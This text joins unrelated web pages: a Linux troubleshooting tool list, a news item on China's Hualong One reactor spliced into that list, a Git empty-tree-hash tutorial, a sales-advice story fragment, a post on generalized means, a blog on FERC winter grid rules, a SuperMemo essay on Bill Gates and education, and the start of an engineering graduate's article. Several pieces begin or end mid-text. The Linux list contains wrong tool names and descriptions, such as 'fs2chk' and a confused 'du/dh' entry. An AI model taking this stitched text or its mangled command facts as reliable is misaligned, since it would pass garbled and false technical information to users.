<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Working in a Linux environment requires knowledge of Linux cli tools and troubleshooting. In this article, it would
be presented CLI tools that are most important for troubleshooting.
Short story
Let say you are working with Linux and your work would be: 1% once-time setup and 99% troubleshooting. So as we can see from these homemade statistics you going to spend most of your time in CLI and finding “why does not work”. This is not a trivial task. It requires knowledge of how Linux works, how subsystems of Linux works,
how complete “line” from typing command up to running, delivering some results works, logs.
Yes, logs are the most important.
So let me start with naming tools and then a short description of some of them.
fs2chk
du/dh
strace/ltrace
lsof
ldd
tcpdump
netstat
mailq/showq
traceroute/tracepath
ping/telnet/nc
dig
curl
nmap
top
ps
pkg manager(rpm, yum, apt, others)
lsmod
awk
sed
vim</p>
<h3>fs2chk</h3>
<p>Used for file system integrity check. Not all time you will have regular shutdown or reboot –
sometimes it happens power goes off and your server gets back with a file system issue. Usually, in that
case is best to use fs2chk</p>
<h3>du/dh</h3>
<p>Command du is used to show space usage per partition. Sometimes happen your partition are used with
some dumb files/logs (crash files) and you need to see what is happening because application or service you try to run report free space issue. Command dh is used to check directory with sub-
directories and discover what file occupied most of the space.</p>
<h3>strace/ltrace</h3>
<p>Running application it just stops at some point. You don’t have logs. Nothing. And there is no debug switch (for example ssh -vvv, where you can see all steps that are done) or any other way to see what is hell going on. So strace is for functions that is used and ltrace are library that are used at some point.
We mostly need trace tool to see details of operation for some applications. Example: we run applications or services and we see an issue and we are not sure why.</p>
<h3>lsof</h3>
<p>You have an issue removing files/files because they are used by some unknown application. Or you want to see how much is open files so you can see if the maximum limit for open files is reached.</p>
<h3>ldd</h3>
<p>When the application does not run at all – the usual suspect is missing the library. This tool is handy to discover which library missing.</p>
<h3>tcpdump</h3>
<p>Connection to server sometimes has issues. So the best way to check what is going on and to troubleshooting is tcpdump. You can pick up the interface, type of protocol, from/to IP, or any low level for all TCP/IP layers.</p>
<h3>netstat</h3>
<p>Simple to see the status of open ports, connection state, and other information that we need to see if services running properly on a given port.</p>
<h3>mailq/showq</h3>
<p>The most vital service in each company is email. And sometimes you need to see what is happening with email (sending or recv). Best tool for this is mailq/showq (it is the same tool, showq is a new one that replace
mailq on older Linux)</p>
<h3>ethtool</h3>
<p>On a low level could happen issue with our ethernet connection and we want to review our cable/port on Linux. So the tool is best for this job. Beside this, you can review other specific ethernet things (auto-negotiation etc)</p>
<h3>traceroute/tracepath</h3>
<p>Ideal to see between server and client if there is a network path issue as also a delay between them.</p>
<h3>ping/telnet/nc</h3>
<p>The very handy tool on the first step to see if is server up as also services.</p>
<h3>dig</h3>
<p>With this tool, you can perform all DNS troubleshooting. Review MX records, A, NS, etc.</p>
<h3>curl</h3>
<p>One of the best tools for troubleshooting different protocols: HTTP, RTMP, FTP, etc. It also has a benchmark integrated for a view of response (DNS, first byte, etc).</p>
<h3>nmap</h3>
<p>A very good tool for discovering services, open ports, and other useful information. Also, you can use on your servers to check if there is some unusual thing and secure them.</p>
<h3>top</h3>
<p>Active process list with memory, CPU, parent/child connection, and other information that helps to see where the issue starts.</p>
<h3>ps</h3>
<p>Process list, you can check and see what is currently running (very quick, the first step for troubleshooting)
pkg manager(rpm, yum, apt, others)
In troubleshooting we need to verify or to find some library or application – so this tool is best for that
operation.</p>
<h3>lsmod</h3>
<p>People who never have issues with kernel modules would never use this tool or get this tool seriously.
The tool provides information about loaded kernel modules as also usage, memory, etc.</p>
<h3>awk/sed/grep</h3>
<p>In a bunch of logs sometimes is a need to find proper information. All these tools are swiss knives for bash scripting and handy for parsing logs for specific information.</p>
<h3>vim</h3>
<p>The best editor in the world. Learn so you can answer on an interview how to quit vim.</p>

																				<p>BEIJING: China has powered up its first domestically developed nuclear reactor — Hualong One — a significant step in Beijing’s attempts to become less dependent on Western countries for energy security and critical technology.</p>
<p>The reactor, which was connected to the national grid on Friday, can generate 10 billion kilowatt-hours of electricity each year and cut carbon emissions by 8.16 million tonnes, according to China National Nuclear Corporation (CNNC).</p>
<p>“This marks China breaking the monopoly of foreign nuclear power technology and officially entering the technology’s first batch of advanced countries,” CNNC said in a statement.</p>
<p>Nuclear plants supplied less than 5% of China’s annual electricity needs in 2019, according to the National Energy Administration, but this share is expected to grow as Beijing attempts to become carbon-neutral by 2060.</p>
<p>Reducing its dependence on Western allies in critical high-tech sectors such as power generation is a key goal in Beijing’s “Made in China 2025” plan.</p>
<p>Billions of dollars in state subsidies have been given to Chinese companies to speed the process — a move that has angered China’s trade partners and sparked a protracted trade row with Washington.</p>
<p>Work on the Hualong One reactor started in 2015 and there are currently six other reactors under construction at home and abroad, the state-owned plant operator CNNC said.</p>
<p>The Hualong One, deployed at a plant in the eastern province of Fujian, will be put into commercial use by the end of the year after undergoing tests.</p>
<p>China has 47 nuclear plants with a total generating capacity of 48.75 Gigawatts — the world’s third highest after the United States and France.</p>
<p>Beijing has invested billions of dollars to develop its nuclear energy sector in recent years as it struggles to wean its economy from coal.</p>
<p>Thirteen nuclear plants are under construction, more than in any other country, despite environmental and safety concerns.</p>
<p>In August 2016, officials were forced to shelve plans for a nuclear waste facility in Lianyungang, a city in eastern Jiangsu province, after a rare public protest by thousands of residents.</p>									</div>

<time datetime="2017-07-07">07 July 2017</time>

<p>After using <a href="https://git-scm.com/">Git</a> for a little while, there is a reasonable chance
you will run across the following hash:</p>
<pre><code>4b825dc642cb6eb9a060e54bf8d69288fbee4904
</code></pre>
<p>So where does it come from, and why should you care?</p>
<h2>Where does the hash come from?</h2>
<p>Every git repository, even an empty repository will contain the hash. This
can be verified with <code>git show</code>:</p>
<pre><code>$ git show 4b825dc642cb6eb9a060e54bf8d69288fbee4904
tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
</code></pre>
<p>So where does this hash come from? Well internally Git keeps track of a few
different object types. The most fundamental object is a blob which represents
file content. Blobs are then referenced by tree objects which represent
directories and commit objects reference tree objects. The diagram below gives
a quick overview of this:</p>
<p><img alt="Git object diagram taken from Pro Git." src="https://floatingoctothorpe.uk/2017/pro-git-objects-diagram.png"></p>
<p><small>The diagram above is taken from <a href="https://git-scm.com/book/en/v2">Pro Git</a> and licensed under
the Creative Commons <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/">Attribution-NonCommercial-ShareAlike 3.0
Unported</a> license.</small></p>
<p><strong>Note</strong>: the <a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Internals chapter</a> from Pro Git has more
info on objects if you're still curious.</p>
<p>So how does the hash fit in? Well it's actually the hash of an empty tree.
This can be verified by creating a object hash for either <code>/dev/null</code> of an
empty string:</p>
<pre><code>$ git hash-object -t tree /dev/null
4b825dc642cb6eb9a060e54bf8d69288fbee4904

$ echo -n '' | git hash-object -t tree --stdin
4b825dc642cb6eb9a060e54bf8d69288fbee4904
</code></pre>
<h2>Using the hash</h2>
<p>The empty tree hash is often used with <a href="https://git-scm.com/docs/git-diff">git diff</a>. For example
if you wanted to check for whitespace errors in a directory, you could use the
<code>--check</code> option and compare <code>HEAD</code> against the empty tree:</p>
<pre><code>$ git diff $(git hash-object -t tree /dev/null) HEAD --check -- po
po/ca.po:7: trailing whitespace.
+# Terminologia i criteris utilitzats
po/ru.po:4: trailing whitespace.
+#
</code></pre>
<p>The empty tree hash is also very useful when writing git hooks. A fairly common
pattern is to validate new commits before accepting them with code similar to
the following:</p>
<pre><code>for changed_file in $(git diff --cached --name-only --diff-filter=ACM HEAD)
do
  if ! validate_file "$changed_file"; then
    echo "Aborting commit"
    exit 1
  fi
done
</code></pre>
<p>This works fine if there are previous commits, however the HEAD reference will
not exist if no commits have been made. To get around this the empty tree hash
can be used when checking the initial commit:</p>
<pre><code>if git rev-parse --verify -q HEAD &gt; /dev/null; then
  against=HEAD
else
  # Initial commit: diff against an empty tree object
  against="$(git hash-object -t tree /dev/null)"
fi

for changed_file in $(git diff --cached --name-only --diff-filter=ACM "$against")
do
  if ! validate_file "$changed_file"; then
    echo "Aborting commit"
    exit 1
  fi
done
</code></pre>

Outside of my classes, I was tinkering.

As I graduated, I joined a software startup in Palo Alto to smile-and-dial as an entry-level sales person. I figured I’d see how these companies were built from the inside out so I could emulate it someday.<br></p><p>Hustle and elbow grease took me from that role, to another startup in NYC, where I helped build the sales team. I went from phone jockey to deal-closer. On my nights and weekends, I was teaching myself to code.</p><p><br>One of those nights, I found Visualize Value on Twitter. The simple theories resonated with my action-oriented mindset. In particular, the idea of a <strong>Permissionless Apprenticeship</strong>.

I started doing “Free Sales Advice Friday,” and business owners would share what they were working on. I would reply with scrappy tactics to go out and find new customers, specifically for their business. </p><figure id="w-node-1ed3a476e59c-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec238bc87551cc41f9091_SBYXJoLLf8A93EpVRlXUzHAg9WB-jV66ry6jmT-imj15yB8FWSyI0I30xN_Vt3e7QVL4i0yxUoIDuQ_3pjeU_-buVwkKgWt-IVLB_ZmEOlzI91RTg3W6cdmATD8V6XMqsA.png" alt=""></p></figure><p>‍</p><p><em>"Some of the best help I've received online, thank you."&nbsp;—&nbsp;Jordan Godbey</em></p><p><em>"That is superb advice." —&nbsp;Andy Whyte</em></p><p><em>"Ryan, this thread is gold!"&nbsp;—&nbsp;Ben Ford<br>‍</em></p><p>I didn’t think too much of the feedback and kept working on my sales job.

But the message didn’t matter to these people, the medium did. And I was the medium.

Then this happened:<br></p><figure id="w-node-b130da7c6edb-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec29f91c0ddef19a5840c_vO6r4tsysvvlePHfASruxWYEHU110pu8Z7TTAT-rcyVbeRxEeKK0YK0RFG3nqC-uqzIJA39A8_2JPvM3foisdyBXsYbgPiWzhz8M4AdWzt52IJ_F8zh6uK8xqSiwiZCEDw.png" alt=""></p></figure><p>On day 1, I hit $170 MRR. More revenue than I was making from my software project. Almost entirely profit. From what was already in my head. It was astonishing to me, that something so innate to me was worthy of an individual’s money.<br></p><h3>By sharing that innate knowledge through Free Sales Advice Friday, I was really embodying the permissionless apprenticeship. Every week I was able to hone my message in a zero-stakes, zero-permission environment. <br></h3><p>If I hadn’t sought out ways to provide free value, I wouldn’t have realize what people would pay me for. By the time I discovered what people wanted to pay for, I had built up enough “brand equity” for early adopters to trust me.<br></p><p>I’m still building my software projects.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			<p>In school, we are first taught the arithmetic mean, then later the geometric mean, and maybe one or two others like the harmonic/contraharmonic mean.</p>
<p>But most teachers do not teach the logic or derivation behind these means. They merely provide the formulas and perhaps provide some scenarios where each mean would be more useful than the others.</p>
<p>I’d like to illustrate the definition of a mean, in the most abstract sense, from a programmer’s perspective, an algorithmic point of view.</p>
<h2>A Balancing Act</h2>
<hr>
<p>Suppose we have a list of N numbers, and a binary operation $f(a,b)$</p>
<p>If we apply that binary operation to one number from the list, we must&nbsp;apply its inverse operation to another number from the list.</p>
<p>We can continue applying $f$ to one element then $f^{-1}$ to another element as many times as we need to, until every number in the list is equal. That number that all elements are equal to…is the mean!</p>
<p>Means are just balancing acts!</p>
<p>** I am aware we haven’t specified the most&nbsp;optimized way to perform this algorithm to ensure it halts.</p>

<h2>Example</h2>
<hr>
<p>let our list be $(2,4,6)$ and our $f(a,b)=a+b$</p>
<p>then we apply the operation and its inverse to two elements respectively:</p>
<p>$(f(2,2), 4 ,f^{-1}(6,2)) = (2+2, 4 ,6-2) =&nbsp;(4,4,4)$</p>
<p>So our mean is 4.&nbsp;We just performed the&nbsp;<em>arithmetic mean</em>!</p>

<h2>What is it good for?</h2>
<hr>
<p>Well, given ANY invertible&nbsp;symmetric binary function, we can define a mean and derive its “shortcut” formula!</p>
<p>Here are the functions that define the means we usually come across:</p>
<p>arithmetic mean: $f(a,b) = a+b$<br>
geometric mean: $f(a,b) = ab$<br>
geometric mean (alternative definition): $f(a,b) = ln(a) + ln(b)$<br>
harmonic mean: $f(a,b) = 1/(1/a + 1/b)$</p>

<h2>Favoring Large or Small Numbers</h2>
<hr>
<p>Now, most of us learn that geometric mean tends to favor smaller&nbsp;numbers.</p>
<p>For example, the arithmetic mean of 1&nbsp;and 100 is $50\frac{1}{2}$. But the geometric mean of 1 and 100 is 10.</p>
<p>Knowing what we do now, can we create a mean that favors smaller numbers&nbsp;even more?</p>
<p>I don’t know if these already exist in the formal mathematics universe, ie. books or published papers. So let me know if you find a previous name for them!</p>
<p>Franken-mean: $f(a,b) = a^b b^a$</p>
<p>Franken-mean v2: $f(a,b) = a^b + b^a$</p>
<p>You might ask if we can skew our mean toward smaller numbers&nbsp;even more than our above exponential mean. We sure can. Using something called Tetration, simply put – it is iterated exponentiation. There are even operations that encompass iterated tetration and so on…these kind of operations are called&nbsp;hyperoperations. So we can make a mean skewed toward lows or highs as much as we want, and it’s beautiful isn’t it? Before different means are taught, the theory of what defines a mean should really be taught.</p>
<p>But before I forget,&nbsp;you must be saying: “Where’s my shortcut formulas?!!”</p>
<p>Okay okay.</p>

<h2>Deriving the Closed Formulas</h2>
<hr>
<p>Let’s derive the arithmetic mean first. Assume we have a list of 4 elements, ${x,y,z,t}$</p>
<p>Given the binary symmetric&nbsp;function that defines the arithmetic mean $f(a,b)=a+b$,</p>
<p>we let $g(a) = f(a,f(a,f(a,a))) = a + a + a + a = 4a$</p>
<p>Our formula for the mean of the 4 numbers in our list will be:</p>
<p>$g^{-1}(f(x,f(y,f(z,t))))$</p>
<p>We know $g(a) = 4a$, so $g^{-1}(a) = a/4$</p>
<p>That means our mean is $(x+y+z+t)/4$, which is what we expected from the arithmetic mean</p>
<p>Above was just a demonstration for a fixed size list of 4 elements. The concept is the same for any sized list. We can use induction to extrapolate what the formula will be for a list of n&nbsp;elements, $(x+y+z+t…….+w)/n$</p>

<h2>Mathematica code for the generalized mean</h2>
<hr>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
InverseFunction[
(Fold[f, ConstantArray[#, Length[l]]]) &amp;
] [Fold[f, l]]
);
</code></pre>
<ul>
<li>Arithmetic Mean
<pre id=""><code>In:= GeneralizedMean[{x,y,z,t},(#+#2)&amp;]
Out= 1/4 (t+x+y+z)</code></pre>
</li>
<li>Geometric Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (#*#2) &amp;]
Out= (t x y z)^(1/4)
</code></pre>
</li>
<li>Harmonic Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (1/(1/# + 1/#2)) &amp;]
Out= 4/(1/t + 1/x + 1/y + 1/z)
</code></pre>
</li>
<li>Franken Mean v1
<pre id=""><code>In:= GeneralizedMean[{x, y}, (#^#2 * #2^#) &amp;]
Out= Log[x^y y^x]/(2 ProductLog[1/2 Log[x^y y^x]])
</code></pre>
</li>
</ul>
<p>I had to use 2 variables for the above, because Mathematica’s symbolic inverses aren’t strong enough.<br>
Franken Mean v2 does not even compute with symbolics or even numbers.<br>
I will eventually work on this to hopefully get at least numerics to work nomatter what.</p>
<h2>Alternative Implementation</h2>
<hr>
<p>This is an alternative implementation which seems to yield better results in some cases:</p>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
Module[{x},
Solve[Fold[f, l] == Fold[f, ConstantArray[x, Length[l]]], x][[-1,
1, 2]]
]);
</code></pre>

<h2>Create your own means!</h2>
<hr>
<p>Enjoy creating your own means! Number theoretic means on lists of primes and that sort of stuff should be very interesting to explore, cheers!</p>

<p><em>P.S.</em></p>
<p>Kolmogorov actually did something similar and came up with what’s called the <a href="https://en.wikipedia.org/wiki/Quasi-arithmetic_mean">Generalized f-mean</a></p>
<p>But he restricted his construct to only functions of the form $f(a,b) = g(a) + g(b)$, where g is the function that determines the mean and is to be specified.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<h4>Winter Weather</h4>
<p>As I wrote in <a href="https://www.amazon.com/Shorting-Grid-Hidden-Fragility-Electric/dp/1735358002/ref=tmm_pap_swatch_0?_encoding=UTF8&amp;qid=1602358089&amp;sr=8-1"><em>Shorting the Grid</em></a>, the quest for reliable electricity in the winter in New England is far more difficult than it needs to be. The root of the problem is the FERC (Federal Energy Regulatory Commission) rules for areas like New England. This area is organized on the <a href="https://www.eia.gov/todayinenergy/detail.php?id=790">RTO system</a>&nbsp; &nbsp;and the FERC rules for RTOs are not particularly concerned with reliable electricity. &nbsp;The rules are very concerned with “fuel neutrality.” In other words, it doesn’t seem to matter if we have rolling blackouts in winter in New England, as long as the rules that <em>led</em> to the rolling blackouts were fair to everyone. The rules especially have to be fair to all the different types of fuels and generators.</p>
<p>Of course, “fair to everyone” is in the eyes of the beholder.</p>
<h4>Local Attempts to Encourage Winter Reliability, Despite FERC</h4>
<p>I document many of the RTO winter problems in <em>Shorting the Grid</em>. ISO-NE, our grid operator, set up the early Winter Reliability Programs. These programs worked well to provide reliability for the grid by making sure gas-fired plants had oil on hand when they couldn’t obtain gas on cold days. Then FERC shut down that program as not being fuel-neutral. In response, ISO-NE suggested a complex formula of fines and rewards, Pay for Performance, to substitute for the Winter Reliability Program. It was approved by FERC, but it failed, financially, within four months of being implemented. &nbsp;Then came the Inventoried Energy plan. &nbsp;That got implemented, on top of the Pay for Performance plans. &nbsp;Next, ISO suggested three new auctions which I reviewed in my book, and I said they would not work. As it happens, these three auctions did not get formally presented to FERC.</p>
<p>Now we get beyond the material presented in <em>Shorting the Grid</em>, because books have a lag time to publication. After ISO-NE set aside the three auctions reviewed in my book, ISO-NE proposed <a href="https://www.utilitydive.com/news/iso-ne-commits-to-address-regional-energy-security-challenges-as-ferc-rejec/588616/?fbclid=IwAR3nrqCXvC9IDbkcFqq2alaXrfCxRTqvJJpKObQP2Wdq5jaJDF10FRDn4sY">three differerent new auctions</a> for FERC approval. &nbsp;Those auction plans were turned down by FERC on October 31 of this year. In the most recent news,<a href="https://rtoinsider.com/iso-ne-to-ferc-fuel-security-179295/"> ISO-NE is asking FERC</a> for guidance in setting up a program which will <em>meet</em> FERC’s fuel-neutral criteria, and still <em>provide</em> reliable electricity in winter in the Northeast. &nbsp;If such a thing can actually be done.</p>
<h4>What Kind of Rock?</h4>
<p>In other words, since FERC seems to turn down any ISO-NE program that might work, maybe FERC can suggest a program? A friend of mine who is retired from the Navy suggested that FERC has been giving orders that are the equivalent of “Get me a rock.” What kind of rock? How big? Round or jagged? Those issues aren’t addressed. As far as I can tell, leadership training in the Navy includes “Don’t give ‘get me a rock’ orders.” Maybe FERC needs a little training?</p>
<p>Despite the lag time required by book publication, <a href="https://www.amazon.com/Shorting-Grid-Hidden-Fragility-Electric/dp/1735358002/ref=tmm_pap_swatch_0?_encoding=UTF8&amp;qid=1602358089&amp;sr=8-1"><em>Shorting</em></a> is still basically up to date. This latest three-auction go-around was predictable to anyone who read my book. The RTO system can’t solve even simple problems of reliability, which is how I started the tale of <em>Shorting</em>, and where I will end this blog post.</p>
<hr>
<p>The great thing about a blog post is that people can comment and start a conversation. Often, I learn important things from my readers.</p>
<p>If you haven’t read <a href="https://www.amazon.com/Shorting-Grid-Hidden-Fragility-Electric/dp/1735358002/ref=tmm_pap_swatch_0?_encoding=UTF8&amp;qid=1602358089&amp;sr=8-1"><em>Shorting the Grid</em></a>, let me encourage you to buy it. If you have read it, let me encourage you to leave a review on Amazon. Amazon decides which books to feature based on the number of reviews, or so I am told. Your review is a sort of gift to me. Thank you.</p>

</p>


<h2><span id="Bill_Gates_is_my_hero">Bill Gates is my hero</span></h2>
<p>Bill Gates was an early guiding light and <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">our</a> inspiration. When <a href="https://supermemo.guru/wiki/Krzysztof_Biedalak" title="Krzysztof Biedalak">Krzysztof Biedalak</a> and I made our first $3 investment in a corporate rubber stamp, which was a post-communist obligation for all companies in Poland in 1991, Microsoft was a multibillion-dollar company. How could we not have been blinded by inspiration? We wanted to write a universally useful piece of software and the world would be ours - we thought. Bill Gates's software philosophy, based on respect for backward compatibility, sheltered <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> on its path to its painfully slow adoption. Software and database compatibility have been preserved for 30 years now. My first pieces of knowledge in medical sciences, typed in on Dec 13, 1987, are still there in my collection, well-memorized and useful. Without Gates and his stance on compatibility, I would have lost all that knowledge to some upgrade hiccup long ago. When Gates moved to philanthropy, he has secured his place on my list of the greatest people who ever walked this planet. Perhaps as many as <a href="https://supermemo.guru/wiki/Bill_Gates_saved_over_100_million_children" title="Bill Gates saved over 100 million children">30-120 million kids have been saved by Bill's foundation</a>. This begs a vital question: Why is Gates so awfully wrong about education? Why does he fall for the same old myth that <a href="https://supermemo.guru/wiki/Myth:_You_can_improve_education_by_throwing_more_money_in_it" title="Myth: You can improve education by throwing more money in it">investing in education will produce better outcomes</a>? The education system is wrong and it must be redesigned. <a href="https://supermemo.guru/wiki/Compulsory_schooling_must_end" title="Compulsory schooling must end">Compulsory schooling must end</a>. See: <a href="https://supermemo.guru/wiki/Grand_Education_Reform" title="Grand Education Reform">Grand Education Reform</a>
</p>
<h2><span id="Could_Bill.27s_great_mind_be_wrong.3F">Could Bill's great mind be wrong?</span></h2>
<p>Everyone who disagrees with a great mind needs to pause and re-examine. Gates got sensational credentials. He sports a genius mind. He has seen more places that I could possibly ever manage to visit in Google Maps. He has spoken to more great people than I have had a chance to read about. He has visited more schools that I have seen on pictures. He started his forays into education in 1999. In contrast, I started thinking about "the system" only in 2016 when getting ready to write this <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">book</a>. This makes me into a fledgling with an immature point of view. Gates himself is a great example of a brisk student who has turned his skills and talents into a monumental achievement. His credentials are so much better than mine!
</p>
<h2><span id="Bill_Gates.27s_perspective">Bill Gates's perspective</span></h2>
<p>Could this just be that Gates's perspective is so much different than mine?
</p><p>He looks at the education system like at the operating system. Measure the performance, look for bottlenecks in the system, fix the parameter here and there, videotape a great teacher, and make others copy the method, and manufacture greatness.
</p><p>He looks at education like a philanthropic job. Like he treats health problems with mass vaccinations, he looks for a simple formula which could improve the education of the masses with some industrial move? He seems less focused on letting the brightest thrive, and more focused on preventing the weakest from dropping out. He wants to bring up the average using some <a href="https://supermemo.guru/wiki/Testing" title="Testing">standardized testing</a> approach.
</p><p>He looks at education like a big company that needs to be managed effectively with departments, and sub-departments. With a clear division of responsibility. <a href="https://supermemo.guru/wiki/Modern_schooling_is_like_Soviet_economy#Schooling_is_like_Soviet_Economy" title="Modern schooling is like Soviet economy">With an industrial goal in mind?</a>
</p><p>Could this be that this great capitalist shows more socialist thinking than a little well-indoctrinated ex-communist like myself?
</p><p>There is a different perspective of an employer and an employee, esp. in a creative position. Gates looks at the number of college graduates. I look for specific skills and creative powers. Actual degrees do not matter much if you take time to get into a particular brain.
</p><p>He looks at students like productive workers. The heretic idea of a longer school day must have come from the factory model thinking. Longer days, more production, more manufacturing.
</p><p>He looks at education from a societal point of view, while I look at the brain of an individual. He wants to move the masses to high achievement, while I want to produce more little Bill Gateses.
</p><p>Unlike myself, Bill Gates does not focus on having more Bill Gateses. He focuses on helping the poor, in boosting qualifications of the middle class, and adds "<i>you can't run a society on top 5%</i>". He is right, however, that top 5% can forge a path in education that would inspire all the rest. They cannot be run through a compulsory system set on pushing through the remaining 95%.
</p><p>Gates's approach would be great for some poorer countries (e.g. in Africa). Where there are no schools, industrial approach and good management could quickly improve health, eliminate poverty, and provide basic education.
</p><p>My approach is probably more suited to well-developed nations where the industrial approach makes people sick of schooling. With social awareness and education on the rise, we look for more little future Noble Prize winners and future Bill Gateses.
</p><p>His own kids get the best kind of learning. During his trips around the world, they get to visit places like the Large Hadron Collider at CERN. This could spark a life-long passion that could turn them into future particle physicists or another incarnation of <a href="https://supermemo.guru/wiki/Tim_Berners-Lee" title="Tim Berners-Lee">Tim Berners-Lee</a>.  
</p><p>Where Gates optimizes for improving the average, I am looking for the optimum of peak intellectual performance.
</p><p>Last but not least, could Gates's approach be an afterglow of his dropping out from Harvard. I see that over and over again, dropouts seem to suffer from this life-long hangover about what could have been? They tend to over-appreciate the power of schooling or the power of college. In the same way, I might be under-appreciating my own degrees. Gates is <a href="https://supermemo.guru/wiki/Thiel_on_competition_for_degrees" title="Thiel on competition for degrees">the opposite of Peter Thiel</a> who studiously climbed the educational ladder until he stumbled to see the light. Thiel is now one of the staunchest critics of college.
</p>
<h2><span id="Bill_Gates.27s_formula_for_success">Bill Gates's formula for success</span></h2>
<p>I see Gates's own life as a simple formula for success in science, engineering, or life in general:
</p>
<ul><li> healthy childhood of few concerns (preferably without the relegation to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>)</li>
<li> healthy approach to schooling with pranks, rebellions, disobedience, and freedom </li>
<li> minor trajectory nudges within the <a href="https://supermemo.guru/wiki/Push_zone" title="Push zone">push zone</a> by inspirational tutors. If tutors are not parents, this might be the most expensive part of the formula</li>
<li> breakthrough passion, e.g. for tinkering with computers or software</li>
<li> healthy education, possibly interrupted by some breakthrough decision (e.g. <i>Let me drop out from Harvard to set up the greatest software company in the world</i>)</li>
<li> relentless lifelong pursuit of goals born from that <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">youthful passion</a></li>
<li> voracious reading (see: <a href="https://supermemo.guru/wiki/Bill_Gates_and_his_non-incremental_reading" title="Bill Gates and his non-incremental reading">Bill Gates and his non-incremental reading</a>)</li></ul>
<p>Only Bill Gates truly knows it, but my understanding of his life story is that his future was determined by just one major factor: getting his hands on a computer. He was good at math and programming. So are dozens of kids in my neighborhood. My thinking comes from the fact that I was also strongly affected by my first contact with computers.
</p>

<p>When <a href="https://supermemo.guru/wiki/First_steps_of_SuperMemo" title="First steps of SuperMemo">I got my first computer in 1986</a>, ZX Spectrum, I was 24 and experienced wild elation with computer's obedience in executing my commands. I told the computer what to do, and it did it perfectly without asking questions. That was wonderful. I started writing my <a href="https://supermemo.guru/wiki/Plan" title="Plan">program for planning my day</a> on paper long before I got the computer on my desk. I was eager to see it work! As ZX Spectrum would load programs from a cassette tape, I could not easily dream of having <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>. It needed access to some disk drive. I got my first PC with a 360 KB <a href="https://en.wikipedia.org/wiki/Floppy_disk">floppy disk</a> drive only <a href="https://supermemo.guru/wiki/SuperMemo_1.0_for_DOS_(1987)" title="SuperMemo 1.0 for DOS (1987)">in 1987</a></p>
<p>The above hypothetical formula for educational success is simple and effective. Only a few might ever dream to replicate the scope of Bill's success. If that formula does not bring serial Nobel Prize winners, it should at least bring up a great deal of happy and fulfilled individuals. Freedom to explore the world is essential and it is denied to a great deal of kids in the modern world. When Peter Thiel pays kids to drop out from college, he looks for this type of free thinking experience that can change one life and then can change the world.
</p>
<h2><span id="My_attempt_at_employing_Gates.27s_formula">My attempt at employing Gates's formula</span></h2>

<p>I am happy with <a href="https://supermemo.guru/wiki/Exponential_adoption_of_spaced_repetition" title="Exponential adoption of spaced repetition">my achievements in life</a>. I have followed the formula employed by Gates. However, there were some exceptions. Perhaps I could use them as an excuse for not being as wildly successful as Bill? I was sent to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>, and I am sure this slowed down my development. The time I spent with my brother was more intellectual and inspirational by two orders of magnitude. However, he was a student and could not babysit the little me for ever. In later years, I was forced into a degree of conformity by an ever-present threat of being enlisted by the army in service of the Warsaw Pact. In 1986, I was finally free of the army service, and could finally drop out, however, I was not ready. There was no market economics culture in Poland of the 1980s. I read about entrepreneurial science in Science in 1989 (Oct 31, 1989). This was the first time when it occurred to me that my research into memory might actually be a seed of a business. Initially, though, my passions led me in the direction of a PhD. Schooling told me that science done by entrepreneurs is inferior to science done in academia. I thought of <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> as an opportunity to earn money for a trip to America. It seems that while Gates was fast to mature as a little entrepreneur, I needed 28 long years to even start thinking of my <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">own business</a>.</p>
<h2><span id="Reconciling_Gates_and_Woz">Reconciling Gates and Woz</span></h2>
<p>Gates wants better teachers, better education, verification, <a href="https://supermemo.guru/wiki/Testing" title="Testing">testing</a>, measuring, carrot-and-stick for teachers, etc. In contrast, I stand with Steve Jobs. Jobs told the kids to <a href="https://supermemo.guru/wiki/Fundamental_law_of_learning" title="Fundamental law of learning">rebel</a>!
</p><p>Gates believes that the key to the <a href="https://supermemo.guru/wiki/Reform" title="Reform">great future education system</a> is the teacher. He is almost right. If we could populate present schools with great teachers, I wouldn't ever need to write <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">this book</a>. The problem is that <a href="https://supermemo.guru/wiki/Progressive_education" title="Progressive education">a great teacher is simply a truly great man</a>. Great teaching requires a degree of genius. We need millions of those great people. How can we possibly hope to produce hundreds of thousands …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        </figure>
        
        <p>In 2018, I graduated from <a href="https://en.wikipedia.org/wiki/%C3%89cole_pour_l%27informatique_et_les_techniques_avanc%C3%A9es">EPITA</a>, a french engineering “Grande École” specialized in computer science. The subjects I had treated there were very technical: from the implementation of an ISO file reader to a <a href="https://www.lrde.epita.fr/~tiger/tiger.html">Tiger compiler</a>.</p>

<p>The technical focus, taught in technical programs such as my engineering school, has led me to some small surprises during my first steps in the business world. The following list outlines what I would have liked to have learned before graduation. The article is obviously influenced by computer science, which is the specialty of my school. Nevertheless, I hope that the students will find some teaching in it, whatever the technical field they are targeting.</p>



<h2 id="human-is-the-new-challenge">Human is the New Challenge</h2>

